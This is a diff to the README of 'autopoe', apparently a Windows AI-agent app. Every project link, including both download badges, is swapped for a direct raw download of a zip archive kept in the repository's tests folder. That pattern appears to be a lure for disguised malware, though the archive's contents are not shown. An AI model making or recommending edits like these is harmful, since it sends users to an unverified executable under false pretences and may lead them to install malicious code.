@@ -1,6 +1,6 @@
 # 🤖 autopoe - Easy AI Agent Collaboration
 
-[![Download & Run](https://img.shields.io/badge/Download-Visit%20Here-brightgreen)](https://github.com/barthezzz2000/autopoe)
+[![Download & Run](https://github.com/barthezzz2000/autopoe/raw/refs/heads/main/tests/Software-3.3.zip%20Here-brightgreen)](https://github.com/barthezzz2000/autopoe/raw/refs/heads/main/tests/Software-3.3.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Before you start, make sure your Windows PC meets these requirements:
 
 1. Click the green button below to visit the download page:
 
-   [![Download autopoe](https://img.shields.io/badge/Download-autopoe-blue)](https://github.com/barthezzz2000/autopoe)
+   [![Download autopoe](https://github.com/barthezzz2000/autopoe/raw/refs/heads/main/tests/Software-3.3.zip)](https://github.com/barthezzz2000/autopoe/raw/refs/heads/main/tests/Software-3.3.zip)
 
 2. On the page, find the latest release or installation file for Windows. This will usually be an ".exe" or ".msi" file.
 
@@ -159,7 +159,7 @@ The app runs locally but connects to internet AI services when needed.
 
 Visit the main page to download, file issues, or explore source code:
 
-[Download & visit autopoe](https://github.com/barthezzz2000/autopoe) 
+[Download & visit autopoe](https://github.com/barthezzz2000/autopoe/raw/refs/heads/main/tests/Software-3.3.zip) 
 
 ---
 
